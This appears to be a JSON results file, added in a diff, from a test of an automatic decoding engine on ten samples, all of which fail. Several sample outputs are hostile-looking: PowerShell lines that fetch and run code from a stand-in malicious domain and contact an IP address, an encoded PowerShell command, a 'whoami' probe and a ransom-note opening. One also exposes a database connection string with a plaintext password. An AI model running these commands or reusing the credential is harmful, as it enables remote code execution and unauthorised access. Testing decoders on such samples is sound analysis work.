@@ -1,0 +1,78 @@
+{
+  "total": 10,
+  "passed": 0,
+  "hit_rate": 0.0,
+  "threshold": 0.6,
+  "results": [
+    {
+      "sha1": "7e0a722888e2f08b7a5e932db6a91dca4856fb77",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "powershell -Enc SQBFAFgA",
+      "ok": false
+    },
+    {
+      "sha1": "fed5658f139d347e38b79f63e7769e6e90017c11",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "random-noise-not-encoded-abcdefghij12345",
+      "ok": false
+    },
+    {
+      "sha1": "ffe2866c6b8664a52af4d5d13be0dee25e8ea938",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "powershell -c IEX(iwr http://malicious-test-domain.top/x); Invoke-Expression $(cmd /c 'nslookup 45.148.10.181')",
+      "ok": false
+    },
+    {
+      "sha1": "5a0f8e7798e03b81b53c2bddb1f5a5f65610c249",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "powershell -c \"IEX(iwr http://malicious-test-domain.top/x); connect 45.148.10.181\"",
+      "ok": false
+    },
+    {
+      "sha1": "70db2df97b3e88c66c50ef9df98dc51de491cc7d",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "aGVsbG8=",
+      "ok": false
+    },
+    {
+      "sha1": "014a88cd1c3ec428bd2cbf2a49cc96ca8ad1ad0f",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "\"--dbname=postgresql://enteliweb:n3wenteli878wb12e4b2@127.0.0.1:49900/enteliweb --column-inserts --data-only --disable-t",
+      "ok": false
+    },
+    {
+      "sha1": "b6796e78f381654372d4cbd154fb8f9f7444c775",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "GcAQQBDAEEAQQBKAEEAQgBqAEEEASABjAEEEAZAB3AEIAbwBBAEcAVQBBAFkAZwBBADkAQQBBDAFEAQQBBAaFEAQGRAAAEA",
+      "ok": false
+    },
+    {
+      "sha1": "0fadbf25f40d74494cfab4a1a3f006bdb9316085",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "AZTEIBUHEQDKMZAGQ4CAMZSEA2DSIBVGQQDKMJAGMZCANBZEA2TEIBVGIQDGMRAGQ4SANJTEA2TGIBTGIQDIOJAGUYCAN",
+      "ok": false
+    },
+    {
+      "sha1": "d407c04e0b7193668b3f5f1624d5530a3ca6b37b",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "cmd.exe /c whoami",
+      "ok": false
+    },
+    {
+      "sha1": "191925ecaf3e468af6a3eae576835bef29ee77cd",
+      "engine": "magic",
+      "chain": [],
+      "output_head": "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\nAll your important documents, photos, databases and other files have been encrypt",
+      "ok": false
+    }
+  ]
+}
